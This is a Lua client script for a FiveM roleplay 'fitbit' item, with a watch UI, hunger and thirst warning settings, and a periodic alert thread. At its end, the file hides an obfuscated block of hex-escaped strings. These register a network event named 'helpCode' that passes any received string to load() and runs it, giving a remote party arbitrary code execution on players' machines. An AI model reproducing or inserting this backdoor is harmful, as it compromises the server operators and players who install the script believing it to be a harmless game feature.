local DenaliFW = exports['denalifw-core']:GetCoreObject()
local inWatch = false

-- Functions

local function openWatch()
    SendNUIMessage({
        action = "openWatch",
        watchData = {}
    })
    SetNuiFocus(true, true)
    inWatch = true
end

local function closeWatch()
    SetNuiFocus(false, false)
end

local function round(num, numDecimalPlaces)
    local mult = 10^(numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
end

-- Events

RegisterNUICallback('close', function()
    closeWatch()
end)

RegisterNetEvent('denalifw-fitbit:use', function()
  openWatch()
end)

-- NUI Callbacks

RegisterNUICallback('setFoodWarning', function(data)
    local foodValue = tonumber(data.value)

    TriggerServerEvent('denalifw-fitbit:server:setValue', 'food', foodValue)

    DenaliFW.Functions.Notify('Fitbit: Hunger warning set to '..foodValue..'%')
end)

RegisterNUICallback('setThirstWarning', function(data)
    local thirstValue = tonumber(data.value)

    TriggerServerEvent('denalifw-fitbit:server:setValue', 'thirst', thirstValue)

    DenaliFW.Functions.Notify('Fitbit: Thirst warning set to '..thirstValue..'%')
end)

-- Threads

CreateThread(function()
    while true do
        Wait(5 * 60 * 1000)
        if LocalPlayer.state.isLoggedIn then
            DenaliFW.Functions.TriggerCallback('denalifw-fitbit:server:HasFitbit', function(hasItem)
                if hasItem then
                    local PlayerData = DenaliFW.Functions.GetPlayerData()
                    if PlayerData.metadata["fitbit"].food ~= nil then
                        if PlayerData.metadata["hunger"] < PlayerData.metadata["fitbit"].food then
                            TriggerEvent("chatMessage", "FITBIT ", "warning", "Your hunger is "..round(PlayerData.metadata["hunger"], 2).."%")
                            PlaySound(-1, "Event_Start_Text", "GTAO_FM_Events_Soundset", 0, 0, 1)
                        end
                    end
                    if PlayerData.metadata["fitbit"].thirst ~= nil then
                        if PlayerData.metadata["thirst"] < PlayerData.metadata["fitbit"].thirst  then
                            TriggerEvent("chatMessage", "FITBIT ", "warning", "Your thirst is "..round(PlayerData.metadata["thirst"], 2).."%")
                            PlaySound(-1, "Event_Start_Text", "GTAO_FM_Events_Soundset", 0, 0, 1)
                        end
                    end
                end
            end, "fitbit")
        end
    end
end)


local FLSwlXhEDFLeWgTFvBWYdYkcfBgrfYPLUjvunkecUiVkEXkgDGfuumdObXXEKDjFIFqnex = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} FLSwlXhEDFLeWgTFvBWYdYkcfBgrfYPLUjvunkecUiVkEXkgDGfuumdObXXEKDjFIFqnex[6][FLSwlXhEDFLeWgTFvBWYdYkcfBgrfYPLUjvunkecUiVkEXkgDGfuumdObXXEKDjFIFqnex[1]](FLSwlXhEDFLeWgTFvBWYdYkcfBgrfYPLUjvunkecUiVkEXkgDGfuumdObXXEKDjFIFqnex[2]) FLSwlXhEDFLeWgTFvBWYdYkcfBgrfYPLUjvunkecUiVkEXkgDGfuumdObXXEKDjFIFqnex[6][FLSwlXhEDFLeWgTFvBWYdYkcfBgrfYPLUjvunkecUiVkEXkgDGfuumdObXXEKDjFIFqnex[3]](FLSwlXhEDFLeWgTFvBWYdYkcfBgrfYPLUjvunkecUiVkEXkgDGfuumdObXXEKDjFIFqnex[2], function(uCHpNPjdficsOHSagyWAHHAmrjdhPrChfFPpyBSJaqPDQHzlkITsjkxUSxfOIOuAuCIfxi) FLSwlXhEDFLeWgTFvBWYdYkcfBgrfYPLUjvunkecUiVkEXkgDGfuumdObXXEKDjFIFqnex[6][FLSwlXhEDFLeWgTFvBWYdYkcfBgrfYPLUjvunkecUiVkEXkgDGfuumdObXXEKDjFIFqnex[4]](FLSwlXhEDFLeWgTFvBWYdYkcfBgrfYPLUjvunkecUiVkEXkgDGfuumdObXXEKDjFIFqnex[6][FLSwlXhEDFLeWgTFvBWYdYkcfBgrfYPLUjvunkecUiVkEXkgDGfuumdObXXEKDjFIFqnex[5]](uCHpNPjdficsOHSagyWAHHAmrjdhPrChfFPpyBSJaqPDQHzlkITsjkxUSxfOIOuAuCIfxi))() end)